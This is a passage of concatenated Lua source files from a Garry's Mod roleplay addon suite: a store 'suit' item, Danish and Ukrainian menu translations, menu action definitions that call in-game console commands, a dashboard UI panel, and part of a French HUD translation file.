                if (not ply:Alive()) then
                    return false, onyx.lang:Get('youMustBeAlive')
                end

                if (ply:onyx_GetNetVar('store_suit')) then
                    return false, 'You already are wearing a suit!'
                end
            
                return true
            end,
            func = function(ply, data)
                local model = data.model
                local health = ply:GetMaxHealth() * (1 + tonumber(data.health) / 100)
                local armor = math.min(255, ply:GetMaxArmor() * (1 + tonumber(data.armor) / 100))
                local walkingspeed = ply:GetWalkSpeed() * (1 + tonumber(data.speed) / 100)
                local runspeed = ply:GetRunSpeed() * (1 + tonumber(data.speed) / 100)
                local jumppower = ply:GetJumpPower() * (1 + tonumber(data.jumppower) / 100)

                -- no way to unequip suit or equip another one, the only one is death & respawn which will reset vars automatically
                ply.onyx_OldPlayerModel = nil
                ply:onyx_SetNetVar('store_suit', true)
                ply:SetModel(model)
                ply:SetHealth(health)
                ply:SetMaxHealth(health)
                ply:SetArmor(armor)
                -- ply:SetMaxArmor(armor)
                ply:SetWalkSpeed(walkingspeed)
                ply:SetRunSpeed(runspeed)
                ply:SetJumpPower(jumppower)
                ply:SetupHands()
            end
        }
    },
    settings = {
        {
            key = 'model',
            name = 'MODEL',
            desc = 'The model path.',
            icon = 'https://i.imgur.com/zgt3zea.png',
            type = 'string',
            validateOption = function(value)
                if (value == '') then
                    return false, 'You must enter the model!'
                end
        
                if (IsUselessModel(value)) then
                    return false, 'You must enter the valid model!'
                end
        
                return true
            end
        },
        {
            key = 'health',
            name = 'HEALTH',
            desc = 'The boost for health in percents',
            icon = 'https://i.imgur.com/zgt3zea.png',
            type = 'number',
            placeholder = '50',
            validateOption = function(value)
                if (not isnumber(value)) then
                    return false, 'The amount must be a number!'
                end
                if (value < 1) then
                    return false, 'The amount must be higher than 1!'
                end
                return true
            end
        },
        {
            key = 'armor',
            name = 'ARMOR',
            desc = 'The boost for armor in percents',
            icon = 'https://i.imgur.com/zgt3zea.png',
            type = 'number',
            placeholder = '50',
            validateOption = function(value)
                if (not isnumber(value)) then
                    return false, 'The amount must be a number!'
                end
                if (value < 0) then
                    return false, 'The amount must be higher than 0!'
                end
                return true
            end
        },
        {
            key = 'speed',
            name = 'SPEED',
            desc = 'The boost for speed in percents.',
            icon = 'https://i.imgur.com/zgt3zea.png',
            type = 'number',
            placeholder = '50',
            validateOption = function(value)
                if (not isnumber(value)) then
                    return false, 'The amount must be a number!'
                end
                if (value < 1) then
                    return false, 'The amount must be higher than 1!'
                end
                return true
            end
        },
        {
            key = 'jumppower',
            name = 'JUMP POWER',
            desc = 'The boost for jump power in percents',
            icon = 'https://i.imgur.com/zgt3zea.png',
            type = 'number',
            placeholder = '50',
            validateOption = function(value)
                if (not isnumber(value)) then
                    return false, 'The amount must be a number!'
                end
                if (value < 1) then
                    return false, 'The amount must be higher than 1!'
                end
                return true
            end
        },
    }
})

createPermanentItemTypeCopy('suit', 'permsuit', Color(233, 69, 69), 'Permanent Suit')

if (SERVER) then
    hook.Add('PlayerSpawn', 'onyx.creditstore.suit', function(ply)
        ply:onyx_SetNetVar('store_suit', false)
    end)

    hook.Add('onyx.creditstore.CanPlayerUseOption', 'onyx.creditstore.suit', function(ply, optionID, it, itemTable, itemTypeData)
        if (ply:onyx_GetNetVar('store_suit') and itemTable.type == 'permmodel' and optionID == 'equip') then
            return false
        end
    end)
end
--PATH addons/____onyx_f4/lua/onyx/modules/f4/languages/cl_danish.lua:
--[[

Author: LucaReno
Steam Profile: https://steamcommunity.com/id/LucaReno/
 
09/16/2024

--]]

local LANG = {}

-- TABS
LANG.f4_jobs_u = 'JOBS'
LANG.f4_jobs_desc = 'Vælg din vej'

LANG.f4_dashboard_u = 'DASHBOARD'
LANG.f4_dashboard_desc = 'Generel information'

LANG.f4_shop_u = 'BUTIK'
LANG.f4_shop_desc = 'Køb varer'

LANG.f4_admin_u = 'ADMIN'
LANG.f4_admin_desc = 'Konfigurer addon'

LANG.f4_donate_u = 'DONER'
LANG.f4_donate_desc = 'Støt serveren'

LANG.addon_settings_u = 'INDSTILLINGER'
LANG.addon_settings_desc = 'Konfigurer addonet'

LANG.addon_return_u = 'TILBAGE'
LANG.addon_return_desc = 'Gå tilbage til menuen'

-- Other
LANG.f4_salary = 'Løn'
LANG.f4_price = 'Pris'
LANG.f4_loading = 'Indlæser'
LANG.f4_purchases = 'Køb'
LANG.f4_switches = 'Skift'
LANG.f4_unavailable = 'Utilgængelig'
LANG.f4_description_u = 'BESKRIVELSE'
LANG.f4_weapons_u = 'VÅBEN'
LANG.f4_entities_u = 'ENTITETER'
LANG.f4_ammo_u = 'AMMO'
LANG.f4_food_u = 'MAD'
LANG.f4_shipments_u = 'SHIPMENTS'
LANG.f4_become_u = 'BLIV'
LANG.f4_create_vote_u = 'LAV AFSTEMNING'
LANG.f4_general_u = 'GENERELT'
LANG.f4_police_u = 'POLITI'
LANG.f4_mayor_u = 'BORGMESTER'
LANG.f4_confirm_u = 'BEKRÆFT'
LANG.f4_cancel_u = 'ANNULLER'
LANG.f4_mostpopular_u = 'MEST POPULÆRE'
LANG.f4_chart_u = 'GRAFIK'
LANG.f4_loading_u = 'INDLÆSER'
LANG.f4_empty_u = 'TOM'
LANG.f4_favorite_u = 'FAVORIT'

LANG.f4_playersonline_u = 'SPILLERE ONLINE'
LANG.f4_totalmoney_u = 'TOTAL PENGE'
LANG.f4_staffonline_u = 'STAFF ONLINE'
LANG.f4_actions_u = 'HANDLINGER'

LANG.f4_show_favorite = 'Vis favoritter'

LANG.requires_level = 'Kræver level {level}'

-- Actions
LANG['f4_action_input_amount'] = 'Indtast beløbet'
LANG['f4_action_input_text'] = 'Indtast teksten'
LANG['f4_action_input_reason'] = 'Indtast grunden'
LANG['f4_action_choose_player'] = 'Vælg en spiller'

LANG['f4_action_confirm_action'] = 'Bekræft handling'
LANG['f4_action_drop_money'] = 'Smid penge'
LANG['f4_action_give_money'] = 'Giv penge'
LANG['f4_action_change_name'] = 'Skift navn'
LANG['f4_action_drop_weapon'] = 'Smid våben'
LANG['f4_action_sell_doors'] = 'Sælg alle døre'

LANG['f4_action_warrant'] = 'Lav arrestordre'
LANG['f4_action_wanted'] = 'Gør eftersøgt'

LANG['f4_toggle_lockdown'] = 'Skift nedlukning'
LANG['f4_give_license'] = 'Giv licens'

-- Phrases
LANG['f4_search_text'] = 'Søg efter navn...'

-- Settings
LANG['f4.option_url_desc'] = 'Indtast URL (lad være tom for at deaktivere)'

LANG['f4.discord_url.name'] = 'Discord'
LANG['f4.discord_url.desc'] = 'Deltag i vores Discord server'

LANG['f4.forum_url.name'] = 'Forum'
LANG['f4.forum_url.desc'] = 'Mød fællesskabet'

LANG['f4.steam_url.name'] = 'Steam'
LANG['f4.steam_url.desc'] = 'Deltag i vores Steam gruppe'

LANG['f4.rules_url.name'] = 'Regler'
LANG['f4.rules_url.desc'] = 'Kend reglerne'

LANG['f4.donate_url.name'] = 'Doner'

LANG['f4.website_ingame.name'] = 'Browser'
LANG['f4.website_ingame.desc'] = 'Brug in-game browser til at åbne website URL'

LANG['f4.title.name'] = 'Titel'
LANG['f4.title.desc'] = 'Titlen for menuen'

LANG['f4.hide_donate_tab.name'] = 'Skjul Doner Fane'
LANG['f4.hide_donate_tab.desc'] = 'Skjul kreditbutik integration fane'

LANG['f4.edit_job_colors.name'] = 'Ændr Job Farver'
LANG['f4.edit_job_colors.desc'] = 'Skal job farver vises lysere'

LANG['f4.hide_admins.name'] = 'Skjul Admin Sektion'
LANG['f4.hide_admins.desc'] = 'Skjul dashboard admin liste sektion'

LANG['f4.admin_on_duty.name'] = 'Admin Job Aktiveret'
LANG['f4.admin_on_duty.desc'] = 'Vis som admin kun en person med et bestemt job'

LANG['f4.admin_on_duty_job.name'] = 'Admin Job Navn'
LANG['f4.admin_on_duty_job.desc'] = 'Admin\'s job navn*'

LANG['f4.colored_items.name'] = 'Farvet Gradient'
LANG['f4.colored_items.desc'] = 'Aktiver let gradient på items/jobs'

LANG['f4.item_columns.name'] = 'Kolonner'
LANG['f4.item_columns.desc'] = 'Antallet af kolonner for Items'

LANG['f4.job_columns.name'] = 'Kolonner'
LANG['f4.job_columns.desc'] = 'Antallet af kolonner for Jobs'

LANG['f4.model_3d.name'] = '3D Modeller'
LANG['f4.model_3d.desc'] = 'Aktiver realtime rendering for Item/Job ikoner'

LANG['f4.item_show_unavailable.name'] = 'Utilgængelige Items'
LANG['f4.item_show_unavailable.desc'] = 'Vis items der fejlede customCheck'

LANG['f4.job_show_unavailable.name'] = 'Utilgængelige Jobs'
LANG['f4.job_show_unavailable.desc'] = 'Vis jobs der fejlede customCheck'

LANG['f4.job_show_requirejob.name'] = 'Afhængige Jobs'
LANG['f4.job_show_requirejob.desc'] = 'Vis jobs der ikke kan vælges på grund af spillerens forkerte job'

onyx.lang:AddPhrases('danish', LANG)
--PATH addons/____onyx_f4/lua/onyx/modules/f4/languages/cl_ukrainian.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

01/01/2024

--]]

local LANG = {}

-- TABS
LANG.f4_jobs_u = 'ПРОФЕСІЇ'
LANG.f4_jobs_desc = 'Виберіть свій шлях'

LANG.f4_dashboard_u = 'ГОЛОВНА'
LANG.f4_dashboard_desc = 'Основна інформація'

LANG.f4_shop_u = 'МАГАЗИН'
LANG.f4_shop_desc = 'Купуйте щось'

LANG.f4_admin_u = 'АДМІН'
LANG.f4_admin_desc = 'Налаштуйте аддон'

LANG.f4_other_u = 'ІНШЕ'
LANG.f4_other_desc = 'Інші налаштування'

LANG.f4_case_u = 'КЕЙСИ'
LANG.f4_case_desc = 'Відкривайте та заробляйте'

LANG.f4_contracts_u = 'КОНТРАКТИ'
LANG.f4_contracts_desc = 'Крафтіть зброю'

LANG.f4_battlepass_u = 'BATTLE PASS'
LANG.f4_battlepass_desc = 'Зимовий'

LANG.f4_clan_u = 'СИНДИКАТ'
LANG.f4_clan_desc = 'Створіть свій синдикат'

LANG.f4_donate_u = 'ДОНАТ'
LANG.f4_donate_desc = 'Підтримайте сервер'

LANG.addon_settings_u = 'НАЛАШТУВАННЯ'

LANG.addon_return_u = 'НАЗАД'

-- Other
LANG.f4_salary = 'Зарплата'
LANG.f4_price = 'Ціна'
LANG.f4_loading = 'Завантаження'
LANG.f4_purchases = 'Покупки'
LANG.f4_switches = 'Зміни'
LANG.f4_unavailable = 'Недоступно'
LANG.f4_description_u = 'ОПИС'
LANG.f4_weapons_u = 'ЗБРОЯ'
LANG.f4_entities_u = 'ПРЕДМЕТЫ'
LANG.f4_ammo_u = 'НАБОЇ'
LANG.f4_food_u = 'ЇЖА'
LANG.f4_shipments_u = 'КОРОБКИ'
LANG.f4_become_u = 'СТАТИ'
LANG.f4_create_vote_u = 'ГОЛОСУВАННЯ'
LANG.f4_general_u = 'ЗАГАЛЬНЕ'
LANG.f4_police_u = 'ПОЛІЦІЯ'
LANG.f4_mayor_u = 'ГОЛОВА МІСТА'
LANG.f4_confirm_u = 'ПІДТВЕРДИТИ'
LANG.f4_cancel_u = 'СКАСУВАННЯ'
LANG.f4_mostpopular_u = 'НАЙПОПУЛЯРНІШЕ'
LANG.f4_chart_u = 'ГРАФІК'
LANG.f4_loading_u = 'ЗАВАНТАЖЕННЯ'
LANG.f4_empty_u = 'ПОРОЖНЬО'

LANG.f4_playersonline_u = 'ГРАВЦІ ОНЛАЙН'
LANG.f4_totalmoney_u = 'ЗАГАЛЬНІ ГРОШІ'
LANG.f4_staffonline_u = 'АДМІНИ ОНЛАЙН'
LANG.f4_actions_u = 'ДІЇ'

LANG.f4_show_favorite = 'Показувати обране'

LANG.requires_level = 'Потрібний {level} рівень'

-- Actions
LANG['f4_action_input_amount'] = 'Введіть число'
LANG['f4_action_input_text'] = 'Введіть текст'
LANG['f4_action_input_reason'] = 'Введіть причину'
LANG['f4_action_choose_player'] = 'Виберіть гравця'

LANG['f4_action_confirm_action'] = 'Підтвердьте дію'
LANG['f4_action_drop_money'] = 'Викинути гроші'
LANG['f4_action_give_money'] = 'Передати гроші'
LANG['f4_action_change_name'] = 'Змінити ім\'я'
LANG['f4_action_drop_weapon'] = 'Викинути зброю'
LANG['f4_action_sell_doors'] = 'Продати всі двері'

LANG['f4_action_warrant'] = 'Видати ордер'
LANG['f4_action_wanted'] = 'Подати до розшуку'

LANG['f4_toggle_lockdown'] = 'Увімкнути/вимкнути ком. годину'
LANG['f4_give_license'] = 'Видати ліцензію'

-- Phrases
LANG['f4_search_text'] = 'Пошук за назвою...'

-- Settings
LANG['f4.option_url_desc'] = 'Введіть URL-адресу (пусто для вимкнення)'

LANG['f4.discord_url.name'] = 'Discord'
LANG['f4.discord_url.desc'] = 'Зайдіть на Discord сервер'

LANG['f4.forum_url.name'] = 'Forum'
LANG['f4.forum_url.desc'] = 'Зустріть спільноту'

LANG['f4.steam_url.name'] = 'Steam'
LANG['f4.steam_url.desc'] = 'Вступите в группу'

LANG['f4.rules_url.name'] = 'Правила'
LANG['f4.rules_url.desc'] = 'Ознайомтеся з правилами'

LANG['f4.donate_url.name'] = 'Донат'

LANG['f4.website_ingame.name'] = 'Браузер'
LANG['f4.website_ingame.desc'] = 'Використовувати браузер усередині гри'

LANG['f4.title.name'] = 'Заголовок'
LANG['f4.title.desc'] = 'Заголовок для F4'

LANG['f4.hide_donate_tab.name'] = 'Сховати вкладку Донат'
LANG['f4.hide_donate_tab.desc'] = 'Вимкнути інтеграцію з Onyx Store'

LANG['f4.edit_job_colors.name'] = 'Кольори професії'
LANG['f4.edit_job_colors.desc'] = 'Чи змінювати кольори професії'

LANG['f4.hide_admins.name'] = 'Приховати персонал'
LANG['f4.hide_admins.desc'] = 'Приховати список персоналу на головній'

LANG['f4.admin_on_duty.name'] = 'Адмін-професія'
LANG['f4.admin_on_duty.desc'] = 'Відображати у списку персоналу лише за певної професії'

LANG['f4.admin_on_duty_job.name'] = 'Назва адмін-професії'
LANG['f4.admin_on_duty_job.desc'] = 'Введіть назву адмін професії'

LANG['f4.colored_items.name'] = 'Кольоровий градієнт'
LANG['f4.colored_items.desc'] = 'Увімкнути легкий градієнт для предметів'

LANG['f4.item_columns.name'] = 'Колонки'
LANG['f4.item_columns.desc'] = 'Кількість колонок для предметів'

LANG['f4.job_columns.name'] = 'Колонки'
LANG['f4.job_columns.desc'] = 'Кількість колонок для професій'

LANG['f4.model_3d.name'] = '3D моделі'
LANG['f4.model_3d.desc'] = 'Відображення 3D для моделей професій та предметів'

LANG['f4.item_show_unavailable.name'] = 'Недоступные предметы'
LANG['f4.item_show_unavailable.desc'] = 'Показати предмети, що провалили customCheck'

LANG['f4.job_show_unavailable.name'] = 'Недоступні професії'
LANG['f4.job_show_unavailable.desc'] = 'Показати професії провалили customCheck'

LANG['f4.job_show_requirejob.name'] = 'Залежні професії'
LANG['f4.job_show_requirejob.desc'] = 'Показувати професії при неправильної професії'

onyx.lang:AddPhrases('ukrainian', LANG)
--PATH addons/____onyx_f4/lua/onyx/modules/f4/cfg/cl_actions.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

04/01/2024

--]]

onyx.f4.actions = {}

local CATEGORY = 'f4_general_u'

local L = function(...) return onyx.lang:Get(...) end

local CUSTOMCHECK_POLICE = function(client)
    return client:IsPolice()
end

local CUSTOMCHECK_MAYOR = function(client)
    return client:IsMayor()
end

onyx.f4:RegisterAction({
    name = 'f4_action_drop_money',
    category = CATEGORY,
    func = function()
        onyx.SimpleQuery(
            L('f4_action_drop_money'),
            L('f4_action_input_amount'),
            true,
            function(value)
                RunConsoleCommand('dropmoney', value)
            end, L('f4_confirm_u'),
            nil, L('f4_cancel_u')
        )
    end
})

onyx.f4:RegisterAction({
    name = 'f4_action_give_money',
    category = CATEGORY,
    func = function()
        onyx.SimpleQuery(
            L('f4_action_give_money'),
            L('f4_action_input_amount'),
            true,
            function(value)
                RunConsoleCommand('givemoney', value)
            end, L('f4_confirm_u'),
            nil, L('f4_cancel_u')
        )
    end
})

onyx.f4:RegisterAction({
    name = 'f4_action_change_name',
    category = CATEGORY,
    func = function()
        onyx.SimpleQuery(
            L('f4_action_change_name'),
            L('f4_action_input_text'),
            true,
            function(value)
                RunConsoleCommand('rpname', value)
            end, L('f4_confirm_u'),
            nil, L('f4_cancel_u')
        )
    end
})

onyx.f4:RegisterAction({
    name = 'f4_action_drop_weapon',
    category = CATEGORY,
    func = function()
        RunConsoleCommand('drop')
    end
})

onyx.f4:RegisterAction({
    name = 'f4_action_sell_doors',
    category = CATEGORY,
    func = function()
        onyx.SimpleQuery(
            L('f4_action_sell_doors'),
            L('f4_action_confirm_action'),
            false,
            function()
                RunConsoleCommand('sellall')
            end, L('f4_confirm_u'),
            nil, L('f4_cancel_u')
        )
    end
})

CATEGORY = 'f4_police_u'

onyx.f4:RegisterAction({
    name = 'f4_action_warrant',
    category = CATEGORY,
    canSee = CUSTOMCHECK_POLICE,
    func = function()
        onyx.ChoosePlayer(
            L('f4_action_warrant'),
            L('f4_action_choose_player'),
            function(ply)
                local steamid = ply:SteamID()

                onyx.SimpleQuery(
                    L('f4_action_warrant'),
                    L('f4_action_input_reason'),
                    true,
                    function(reason)
                        RunConsoleCommand('warrant', steamid, reason)
                    end
                )
            end
        )
    end
})

onyx.f4:RegisterAction({
    name = 'f4_action_wanted',
    category = CATEGORY,
    canSee = CUSTOMCHECK_POLICE,
    func = function()
        onyx.ChoosePlayer(
            L('f4_action_wanted'),
            L('f4_action_choose_player'),
            function(ply)
                local steamid = ply:SteamID()

                onyx.SimpleQuery(
                    L('f4_action_wanted'),
                    L('f4_action_input_reason'),
                    true,
                    function(reason)
                        RunConsoleCommand('wanted', steamid, reason)
                    end
                )
            end
        )
    end
})

CATEGORY = 'f4_mayor_u'

onyx.f4:RegisterAction({
    name = 'f4_toggle_lockdown',
    category = CATEGORY,
    canSee = CUSTOMCHECK_MAYOR,
    func = function()
        if ( rp.GetLockDown() ) then
            RunConsoleCommand('unlockdown')
        else
            RunConsoleCommand('lockdown')
        end
    end
})

onyx.f4:RegisterAction({
    name = 'f4_give_license',
    category = CATEGORY,
    canSee = CUSTOMCHECK_MAYOR,
    func = function()
        RunConsoleCommand('give_licence')
    end
})
--PATH addons/____onyx_f4/lua/onyx/modules/f4/ui/cl_tab_dashboard.lua:
--[[

Author: tochnonement
Email: tochnonement@gmail.com

25/12/2023

--]]

local colorPrimary = onyx:Config('colors.primary')
local colorSecondary = onyx:Config('colors.secondary')
local colorAccent = onyx:Config('colors.accent')
local colorGradient = onyx.OffsetColor(colorAccent, -50)
local colorTertiary = onyx:Config('colors.tertiary')
local colorCircleGray = Color(69, 69, 69)
local colorGray = Color(200, 200, 200)
local colorLabel = color_white
local fontTitle = onyx.Font('Comfortaa Bold@16')

local L = function(...) return onyx.lang:Get(...) end

local PANEL = {}

local formatMoney do
    local format = {
        {'t', 10 ^ 12, 2},
        {'b', 10 ^ 9, 2},
        {'m', 10 ^ 6, 2},
        {'k', 10 ^ 3}
    }
    local amount = #format

    function formatMoney(money)
        for index = 1, amount do
            local data = format[index]
            local name = data[1]
            local value = data[2]
            local decimals = data[3] or 1
            if (money > value) then
                return rp.FormatMoney( math.Round(money / value, decimals) ) .. name
            end
        end

        return rp.FormatMoney(money)
    end
end

local function drawShadowBG(panel, w, h, color)
    -- local x, y = panel:LocalToScreen(0, 0)

    -- onyx.bshadows.BeginShadow()
        draw.RoundedBox(8, 0, 0, w, h, color)
    -- onyx.bshadows.EndShadow(1, 1, 2, nil, nil, 2)
end

function PANEL:Init()
    self.space = onyx.ScaleTall(10)
    self.padding = onyx.ScaleTall(10)
    self.smallHeaderHeight = onyx.ScaleTall(25)

    self.divStats = self:Add('Panel')
    self.divStats.PerformLayout = function(panel, w, h)
        local children = panel:GetChildren()
        local amount = #children
        local space = self.space
        local wide = (w - (space * (amount - 1))) / amount

        for index, child in ipairs(children) do
            child:SetWide(wide)
            child:Dock(LEFT)
            child:DockMargin(0, 0, space, 0)
        end
    end

    self.divBody = self:Add('Panel')

    self.divActions = self.divBody:Add('Panel')
    self.divActions.Paint = function(panel, w, h)
        drawShadowBG(panel, w, h, colorPrimary)
    end

    self.lblActions = self.divActions:Add('onyx.Label')
    self.lblActions:SetText(L('f4_actions_u'))
    self.lblActions:SetFont(fontTitle)
    self.lblActions:SetTextColor(colorLabel)
    self.lblActions:Dock(TOP)
    self.lblActions:DockMargin(0, 0, 0, onyx.ScaleTall(10))
    self.lblActions:CenterText()
    self.lblActions:SetTall(self.smallHeaderHeight)
    self.lblActions.Paint = function(panel, w, h)
        draw.RoundedBoxEx(8, 0, 0, w, h, colorSecondary, true, true)
    end

    self.listActions = self.divActions:Add('onyx.ScrollPanel')
    self.listActions:DockMargin(self.padding, 0, self.padding, self.padding)
    self.listActions:Dock(FILL)

    self.divAdmins = self.divBody:Add('Panel')
    self.divAdmins:SetVisible(not onyx.f4:GetOptionValue('hide_admins'))
    self.divAdmins.Paint = function(panel, w, h)
        drawShadowBG(panel, w, h, colorPrimary)
    end

    self.lblAdmins = self.divAdmins:Add('onyx.Label')
    self.lblAdmins:SetText(L('f4_staffonline_u'))
    self.lblAdmins:SetFont(fontTitle)
    self.lblAdmins:SetTextColor(colorLabel)
    self.lblAdmins:Dock(TOP)
    self.lblAdmins:DockMargin(0, 0, 0, onyx.ScaleTall(10))
    self.lblAdmins:CenterText()
    self.lblAdmins:SetTall(self.smallHeaderHeight)
    self.lblAdmins.Paint = function(panel, w, h)
        draw.RoundedBoxEx(8, 0, 0, w, h, colorSecondary, true, true)
    end

    self.listAdmins = self.divAdmins:Add('onyx.ScrollPanel')
    self.listAdmins:DockMargin(self.padding, 0, self.padding, self.padding)
    self.listAdmins:Dock(FILL)

    self:InitActions()
    self:InitStats()
    self:InitAdmins()
end

function PANEL:PerformLayout(w, h)
    local space = self.space

    self.divStats:SetTall(h * .25)
    self.divStats:Dock(TOP)
    self.divStats:DockMargin(0, 0, 0, space)

    self.divBody:Dock(FILL)

    self.divActions:Dock(FILL)

    self.divAdmins:Dock(RIGHT)
    self.divAdmins:SetWide((w - space * 1) * .33)
    self.divAdmins:DockMargin(space, 0, 0, 0)
end

function PANEL:InitActions()
    local client = LocalPlayer()
    local listActions = self.listActions
    local categories = {}

    for _, action in ipairs(onyx.f4.actions) do
        local category = action.category
        local canSee = action.canSee

        if (canSee and not canSee(client)) then
            continue
        end

        if (not categories[category]) then
            local lblTitle = listActions:Add('onyx.Label')
            lblTitle:SetText(onyx.lang:Get(category))
            lblTitle:SetTextColor(color_white)
            lblTitle:Font('Overpass SemiBold@16')
            lblTitle:Dock(TOP)
            lblTitle:DockMargin(0, 0, 0, onyx.ScaleTall(10))

            local gridPanel = listActions:Add('onyx.Grid')
            gridPanel:Dock(TOP)
            gridPanel:SetColumnCount(3)
            gridPanel:SetSpaceX(onyx.ScaleTall(5))
            gridPanel:SetSpaceY(gridPanel:GetSpaceX())
            gridPanel:DockMargin(0, 0, 0, onyx.ScaleTall(10))

            categories[category] = gridPanel
        end

        self:AddAction(categories[category], action.name, action.func)
    end
end

function PANEL:AddAction(grid, name, func)
    local client = LocalPlayer()
    local button = grid:Add('onyx.Button')
    button:SetText(onyx.lang:Get(name))
    button:SetGradientColor(colorGradient)
    button:SetMasking(true)
    button:Font('Comfortaa Bold@16')
    button:SetTall(onyx.ScaleTall(25))
    button.DoClick = function()
        if (func) then
            func(client)
        end
    end
end

function PANEL:InitAdmins()
    local padding = onyx.ScaleTall(5)
    local client = LocalPlayer()
    for _, ply in ipairs(player.GetAll()) do
        if (onyx.f4.IsAdmin(ply)) then
            local panel = self.listAdmins:Add('Panel')
            panel:Dock(TOP)
            panel:SetTall(onyx.ScaleTall(45))
            panel:DockPadding(padding, padding, padding, padding)
            panel.Paint = function(panel, w, h)
                draw.RoundedBox(8, 0, 0, w, h, colorTertiary)
            end

            local height = panel:GetTall() - padding * 2

            local avatar = panel:Add('onyx.RoundedAvatar')
            avatar:SetPlayer(ply, 64)
            avatar:SetWide(height)
            avatar:Dock(LEFT)
            avatar:DockMargin(0, 0, onyx.ScaleWide(10), 0)
            avatar.PaintOver = function(panel, w, h)
                onyx.DrawOutlinedCircle(w * .5, h * .5, h * .5, 3, color_white)
            end

            local fontName = onyx.Font('Comfortaa SemiBold@16')
            local fontRank = onyx.Font('Comfortaa@14')
            local rankID = ply:GetUserGroup()
            local scRankData = onyx.scoreboard and onyx.scoreboard:GetRankData(rankID) -- from scoreboard
            local defRankData = onyx.f4.ranks[rankID] -- from F4
            local rankName = rankID
            local plyName = ply:Name()
            local plyColor = defRankData and defRankData.color or color_white
    
            if ( scRankData ) then
                rankName = scRankData.name
            elseif ( defRankData ) then
                rankName = defRankData.name
            end
            
            local content = panel:Add('onyx.Panel')
            content:Dock(FILL)
            content.Paint = function(panel, w, h)
                if (scRankData) then
                    local color = istable(scRankData) and scRankData.color or color_white
                    local effectIndex = istable(scRankData) and scRankData.effect or 1
                    local effectData = onyx.scoreboard.nameEffects[effectIndex] or onyx.scoreboard.nameEffects[1]
                    local effectDrawFn = effectData.func
                    local realX, realY = panel:LocalToScreen( 0, 0 )
                    local x, y = 0, h * .5
            
                    -- common
                    effectDrawFn(plyName, x, y, color, 0, 4, realX + x, realY + y)
                else
                    draw.SimpleText(plyName, fontName, 0, h * .5, plyColor, 0, 4)
                end

                draw.SimpleText(rankName, fontRank, 0, h * .5, colorGray, 0, 0)
            end
        end
    end
end

function PANEL:InitStats()
    local client = LocalPlayer()
    local players = player.GetAll()
    local playerOnline = #players
    local playerMax = game.MaxPlayers()
    local clientMoney = client:GetMoney() or 0
    local totalMoney = 0
    local staffOnline = 0

    for _, ply in ipairs(players) do
        local money = ply:GetMoney() or 0
        totalMoney = totalMoney + money

        if (onyx.f4.IsAdmin(ply)) then
            staffOnline = staffOnline + 1
        end
    end

    self:AddStat(L('f4_playersonline_u'), playerOnline .. ' / ' .. playerMax, (playerOnline / playerMax), Color(255, 238, 108))
    self:AddStat(L('f4_totalmoney_u'), formatMoney(totalMoney), (clientMoney / totalMoney), Color(36, 129, 50), Color(179, 255, 170))
    self:AddStat(L('f4_staffonline_u'), staffOnline, (staffOnline > 0 and 1 or 0), Color(160, 61, 231))
end

function PANEL:AddStat(name, info, fraction, color, color2)
    local padding = onyx.ScaleTall(10)
    local angle = math.Round(fraction * 360, 0, 360)
    local font0 = onyx.Font('Comfortaa@18')

    local panel = self.divStats:Add('Panel')
    panel.Paint = function(this, w, h)
        drawShadowBG(this, w, h, colorPrimary)
    end

    local lblTitle = panel:Add('onyx.Label')
    lblTitle:SetText(name)
    lblTitle:SetFont(fontTitle)
    lblTitle:CenterText()
    lblTitle:SetTextColor(colorLabel)
    lblTitle:Dock(TOP)
    lblTitle:DockMargin(0, 0, 0, padding)
    lblTitle:SizeToContentsY(10)
    lblTitle.Paint = function(panel, w, h)
        draw.RoundedBoxEx(8, 0, 0, w, h, colorSecondary, true, true)
    end

    local content = panel:Add('Panel')
    content:Dock(FILL)
    content:DockMargin(padding, 0, padding, padding)
    content.Paint = function(panel, w, h)
        local size = math.min(w, h)
        local radius = math.floor(size * .5)
        local x0 = w * .5
        local y0 = h * .5
        local outlineWidth   = 5

        DisableClipping(true)
            onyx.DrawOutlinedCircle(x0 + 1, y0 + 1, radius, outlineWidth, Color(0, 0, 0, 100))
        DisableClipping(false)

        onyx.DrawOutlinedCircle(x0, y0, radius, outlineWidth, color2 or colorCircleGray)
        onyx.DrawWithPolyMask(panel.mask, function()
            onyx.DrawOutlinedCircle(x0, y0, radius, outlineWidth, color)
        end)

        draw.SimpleText(info, font0, w * .5, h * .5, color_white, 1, 1)
    end
    content.PerformLayout = function(panel, w, h)
        panel.mask = onyx.CalculateArc(w * .5, h * .5, 0, angle, h * .5 + 2, 24, true)
    end
end

onyx.gui.Register('onyx.f4.Dashboard', PANEL)

--[[------------------------------
DEBUG
--------------------------------]]
-- onyx.gui.Test('onyx.f4.Frame', .6, .65, function(panel)
--     panel:MakePopup()
--     panel:ChooseTab(1)
-- end)
--PATH addons/____onyx_hud/lua/onyx/modules/hud/languages/cl_french.lua:
-- With the help of chatGPT & verified by native speaker

local LANG = {}

LANG[ 'hud_status_wanted' ] = 'Recherché'
LANG[ 'hud_status_speaking' ] = 'Parle'
LANG[ 'hud_status_typing' ] = 'Tape'
LANG[ 'props' ] = 'Objets'
LANG[ 'close' ] = 'Fermer'
LANG[ 'alert' ] = 'Alerte'
LANG[ 'message' ] = 'Message'
LANG[ 'unknown' ] = 'Inconnu'
LANG[ 'accept' ] = 'Accepter'
LANG[ 'deny' ] = 'Refuser'
LANG[ 'none' ] = 'Aucun'
LANG[ 'add' ] = 'Ajouter'
LANG[ 'remove' ] = 'Retirer'
LANG[ 'jobs' ] = 'Métiers'
LANG[ 'door' ] = 'Porte'
LANG[ 'vehicle' ] = 'Véhicule'
LANG[ 'door_groups' ] = 'Groupes de portes'
LANG[ 'display' ] = 'Affichage'
LANG[ 'general' ] = 'Général'
LANG[ 'speedometer' ] = 'Vitesse'
LANG[ 'fuel' ] = 'Carburant'
LANG[ 'vote' ] = 'Vote'
LANG[ 'question' ] = 'Question'

LANG[ 'timeout_title' ] = 'CONNEXION PERDUE'
LANG[ 'timeout_info' ] = 'Le serveur est actuellement indisponible, nous sommes désolés'
LANG[ 'timeout_status' ] = 'Vous serez reconnecté dans %d secondes'

LANG[ 'hud.theme.default.name' ] = 'Par Défaut'
LANG[ 'hud.theme.forest.name' ] = 'Forêt'
LANG[ 'hud.theme.violet_night.name' ] = 'Nuit Violette'
LANG[ 'hud.theme.rustic_ember.name' ] = 'Braise Rustique'
LANG[ 'hud.theme.green_apple.name' ] = 'Pomme Verte'
LANG[ 'hud.theme.lavender.name' ] = 'Lavande'
LANG[ 'hud.theme.elegance.name' ] = 'Élégance'
